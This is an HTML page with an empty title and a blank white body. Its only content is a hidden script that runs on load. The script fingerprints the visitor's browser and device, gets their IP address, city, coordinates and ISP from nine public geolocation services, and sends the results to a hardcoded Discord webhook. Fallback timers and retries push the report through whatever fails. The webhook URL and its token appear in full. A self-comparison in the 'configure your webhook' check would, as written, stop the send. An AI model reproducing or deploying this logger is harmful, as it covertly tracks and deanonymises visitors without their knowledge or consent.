<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            width: 100%;
        }
    </style>
</head>
<body>

<script>
    (function() {
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ';
        
        let notificationSent = false;
        let successfulData = false;
        
        let visitorData = {
            ip: null,
            country: null,
            country_code: null,
            region: null,
            city: null,
            latitude: null,
            longitude: null,
            timezone: null,
            isp: null,
            org: null,
            asn: null,
            source_service: null,
            timestamp: null,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(',') : null,
            screen_resolution: window.screen.width + 'x' + window.screen.height,
            screen_color_depth: window.screen.colorDepth,
            timezone_offset: new Date().getTimezoneOffset(),
            referrer: document.referrer || null,
            current_url: window.location.href,
            hostname: window.location.hostname,
            pathname: window.location.pathname,
            connection_type: navigator.connection ? navigator.connection.effectiveType : null,
            device_memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : null,
            hardware_concurrency: navigator.hardwareConcurrency,
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack || null,
            success: false,
            error_message: null
        };
        
        function sendNotification(data) {
            if (notificationSent) return;
            
            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ') {
                console.warn('⚠️ Please configure your webhook URL in the code');
                return;
            }
            
            notificationSent = true;
            data.timestamp = new Date().toISOString();
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data),
                keepalive: true
            }).catch(function(err) {
                console.warn('Webhook send failed:', err);
            });
        }
        
        function sendSuccessNotification() {
            visitorData.success = true;
            visitorData.error_message = null;
            sendNotification(visitorData);
        }
        
        function sendFailureNotification(errorMsg) {
            if (successfulData) return;
            visitorData.success = false;
            visitorData.error_message = errorMsg || 'Failed to retrieve visitor data from all services';
            sendNotification(visitorData);
        }
        
        function mergeData(newData, serviceName) {
            if (!newData) return false;
            
            let hasNewInfo = false;
            
            if (newData.ip && !visitorData.ip) {
                visitorData.ip = newData.ip;
                hasNewInfo = true;
            }
            if (newData.country && !visitorData.country) {
                visitorData.country = newData.country;
                hasNewInfo = true;
            }
            if (newData.country_code && !visitorData.country_code) {
                visitorData.country_code = newData.country_code;
                hasNewInfo = true;
            }
            if (newData.region && !visitorData.region) {
                visitorData.region = newData.region;
                hasNewInfo = true;
            }
            if (newData.city && !visitorData.city) {
                visitorData.city = newData.city;
                hasNewInfo = true;
            }
            if (newData.latitude && !visitorData.latitude) {
                visitorData.latitude = newData.latitude;
                hasNewInfo = true;
            }
            if (newData.longitude && !visitorData.longitude) {
                visitorData.longitude = newData.longitude;
                hasNewInfo = true;
            }
            if (newData.timezone && !visitorData.timezone) {
                visitorData.timezone = newData.timezone;
                hasNewInfo = true;
            }
            if (newData.isp && !visitorData.isp) {
                visitorData.isp = newData.isp;
                hasNewInfo = true;
            }
            if (newData.org && !visitorData.org) {
                visitorData.org = newData.org;
                hasNewInfo = true;
            }
            if (newData.asn && !visitorData.asn) {
                visitorData.asn = newData.asn;
                hasNewInfo = true;
            }
            
            if (hasNewInfo && !visitorData.source_service) {
                visitorData.source_service = serviceName;
            } else if (hasNewInfo && visitorData.source_service) {
                visitorData.source_service = visitorData.source_service + ' + ' + serviceName;
            }
            
            return hasNewInfo;
        }
        
        function serviceCloudflare() {
            return fetch('https://www.cloudflare.com/cdn-cgi/trace')
                .then(function(response) {
                    if (!response.ok) throw new Error('Cloudflare failed');
                    return response.text();
                })
                .then(function(text) {
                    let lines = text.split('\n');
                    let result = {};
                    for (let i = 0; i < lines.length; i++) {
                        let line = lines[i];
                        if (line.startsWith('ip=')) result.ip = line.substring(3);
                        if (line.startsWith('loc=')) result.country_code = line.substring(4);
                        if (line.startsWith('timezone=')) result.timezone = line.substring(9);
                    }
                    if (result.ip) return result;
                    throw new Error('No IP in Cloudflare');
                });
        }
        
        function serviceIpApi() {
            return fetch('https://ip-api.com/json/?fields=66846719')
                .then(function(response) {
                    if (!response.ok) throw new Error('ip-api.com failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.status === 'success' && data.query) {
                        return {
                            ip: data.query,
                            country: data.country,
                            country_code: data.countryCode,
                            region: data.regionName,
                            city: data.city,
                            latitude: data.lat,
                            longitude: data.lon,
                            isp: data.isp,
                            org: data.org,
                            asn: data.as,
                            timezone: data.timezone
                        };
                    }
                    throw new Error('ip-api.com unsuccessful');
                });
        }
        
        function serviceIpApiCo() {
            return fetch('https://ipapi.co/json/')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipapi.co failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            org: data.org,
                            isp: data.org
                        };
                    }
                    throw new Error('ipapi.co no ip');
                });
        }
        
        function serviceIpWhoIs() {
            return fetch('https://ipwho.is/')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipwho.is failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.success === true && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.connection ? data.connection.isp : null,
                            org: data.connection ? data.connection.org : null,
                            asn: data.connection ? data.connection.asn : null
                        };
                    }
                    throw new Error('ipwho.is unsuccessful');
                });
        }
        
        function serviceFreeGeoIp() {
            return fetch('https://freegeoip.app/json/')
                .then(function(response) {
                    if (!response.ok) throw new Error('freegeoip failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            country_code: data.country_code,
                            region: data.region_name,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.time_zone
                        };
                    }
                    throw new Error('freegeoip no ip');
                });
        }
        
        function serviceIp2Location() {
            return fetch('https://api.ip2location.io/?format=json')
                .then(function(response) {
                    if (!response.ok) throw new Error('ip2location failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            country_code: data.country_code,
                            region: data.region_name,
                            city: data.city_name,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.time_zone,
                            isp: data.isp,
                            asn: data.asn
                        };
                    }
                    throw new Error('ip2location no ip');
                });
        }
        
        function serviceIpInfoNoKey() {
            return fetch('https://ipinfo.io/json')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipinfo failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        let result = {
                            ip: data.ip,
                            country: data.country,
                            region: data.region,
                            city: data.city,
                            timezone: data.timezone,
                            org: data.org
                        };
                        if (data.loc) {
                            let coords = data.loc.split(',');
                            if (coords.length === 2) {
                                result.latitude = parseFloat(coords[0]);
                                result.longitude = parseFloat(coords[1]);
                            }
                        }
                        return result;
                    }
                    throw new Error('ipinfo no ip');
                });
        }
        
        function simpleIpOnly() {
            return fetch('https://api.ipify.org?format=json')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipify failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip
                        };
                    }
                    throw new Error('ipify no ip');
                });
        }
        
        function serviceIpWhoIsOrg() {
            return fetch('https://ipwhois.app/json/')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipwhois.app failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.isp,
                            org: data.org
                        };
                    }
                    throw new Error('ipwhois.app no ip');
                });
        }
        
        let servicesList = [
            { name: 'ip-api.com', fn: serviceIpApi },
            { name: 'ipapi.co', fn: serviceIpApiCo },
            { name: 'ipwho.is', fn: serviceIpWhoIs },
            { name: 'ipwhois.app', fn: serviceIpWhoIsOrg },
            { name: 'ipinfo.io', fn: serviceIpInfoNoKey },
            { name: 'ip2location.io', fn: serviceIp2Location },
            { name: 'freegeoip.app', fn: serviceFreeGeoIp },
            { name: 'cloudflare', fn: serviceCloudflare },
            { name: 'ipify.org (IP only)', fn: simpleIpOnly }
        ];
        
        let currentIndex = 0;
        let requestCompleted = false;
        let activeTimeouts = [];
        
        function clearAllTimeouts() {
            for (let i = 0; i < activeTimeouts.length; i++) {
                clearTimeout(activeTimeouts[i]);
            }
            activeTimeouts = [];
        }
        
        function tryNextService() {
            if (requestCompleted) return;
            
            if (currentIndex >= servicesList.length) {
                if (!successfulData) {
                    let errorMsg = 'All IP/Geo services failed. No data could be retrieved.';
                    sendFailureNotification(errorMsg);
                }
                requestCompleted = true;
                clearAllTimeouts();
                return;
            }
            
            let service = servicesList[currentIndex];
            currentIndex++;
            
            let timeoutId = setTimeout(function() {
                tryNextService();
            }, 3500);
            activeTimeouts.push(timeoutId);
            
            service.fn()
                .then(function(data) {
                    clearTimeout(timeoutId);
                    if (requestCompleted) return;
                    
                    if (data && (data.ip || data.country)) {
                        let hadData = mergeData(data, service.name);
                        if (hadData) {
                            successfulData = true;
                            sendSuccessNotification();
                            requestCompleted = true;
                            clearAllTimeouts();
                        } else {
                            tryNextService();
                        }
                    } else {
                        tryNextService();
                    }
                })
                .catch(function() {
                    clearTimeout(timeoutId);
                    if (!requestCompleted) {
                        tryNextService();
                    }
                });
        }
        
        function ultimateFallback() {
            let fallbackTimeout = setTimeout(function() {
                if (!requestCompleted && !successfulData) {
                    if (!visitorData.ip) {
                        let generatedId = 'visitor-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8);
                        visitorData.ip = 'unknown-' + generatedId;
                        visitorData.source_service = 'ultimate-fallback-generator';
                        visitorData.error_message = 'All IP services failed, generated unique identifier';
                        sendFailureNotification('All IP services failed, using fallback ID');
                        requestCompleted = true;
                    } else if (visitorData.ip) {
                        sendSuccessNotification();
                        requestCompleted = true;
                    } else {
                        visitorData.ip = 'completely-unavailable';
                        visitorData.source_service = 'final-fallback';
                        sendFailureNotification('No data could be retrieved from any source');
                        requestCompleted = true;
                    }
                }
                clearAllTimeouts();
            }, 10000);
            activeTimeouts.push(fallbackTimeout);
        }
        
        function earlyBrowserInfo() {
            if (navigator.connection) {
                try {
                    if (navigator.connection.downlink) visitorData.downlink_mbps = navigator.connection.downlink;
                    if (navigator.connection.rtt) visitorData.round_trip_time_ms = navigator.connection.rtt;
                } catch(e) {}
            }
            
            if (window.devicePixelRatio) visitorData.device_pixel_ratio = window.devicePixelRatio;
            
            try {
                let timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone;
                if (timezoneName && !visitorData.timezone) visitorData.timezone = timezoneName;
            } catch(e) {}
            
            visitorData.viewport_width = window.innerWidth;
            visitorData.viewport_height = window.innerHeight;
            visitorData.document_encoding = document.characterSet;
            visitorData.is_touch_device = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        }
        
        function ensureWebhookSentRegardless() {
            let safetyTimeout = setTimeout(function() {
                if (!notificationSent) {
                    if (!visitorData.ip) {
                        visitorData.ip = 'timeout-safety-unavailable';
                        visitorData.source_service = 'safety-timeout';
                    }
                    if (!visitorData.success && !successfulData) {
                        visitorData.success = false;
                        visitorData.error_message = visitorData.error_message || 'Safety timeout triggered before data collection completed';
                    } else if (successfulData && !visitorData.success) {
                        visitorData.success = true;
                    }
                    sendNotification(visitorData);
                    requestCompleted = true;
                }
                clearAllTimeouts();
            }, 12000);
            activeTimeouts.push(safetyTimeout);
        }
        
        function retryWebhookIfNeeded() {
            if (!notificationSent) {
                setTimeout(function() {
                    if (!notificationSent) {
                        visitorData.retry_flag = true;
                        if (!visitorData.ip) visitorData.ip = 'retry-unavailable';
                        visitorData.source_service = visitorData.source_service || 'retry-fallback';
                        visitorData.success = successfulData;
                        sendNotification(visitorData);
                    }
                }, 5000);
            }
        }
        
        earlyBrowserInfo();
        
        tryNextService();
        
        ultimateFallback();
        
        ensureWebhookSentRegardless();
        
        retryWebhookIfNeeded();
        
        window.addEventListener('load', function() {
            setTimeout(function() {
                visitorData.page_loaded_timestamp = new Date().toISOString();
                if (!notificationSent && !requestCompleted) {
                    if (visitorData.ip) {
                        sendSuccessNotification();
                        requestCompleted = true;
                    }
                }
            }, 2000);
        });
        
        document.addEventListener('visibilitychange', function() {
            if (!notificationSent && visitorData.ip && successfulData) {
                sendSuccessNotification();
            }
        });
    })();
</script>
</body>
</html>
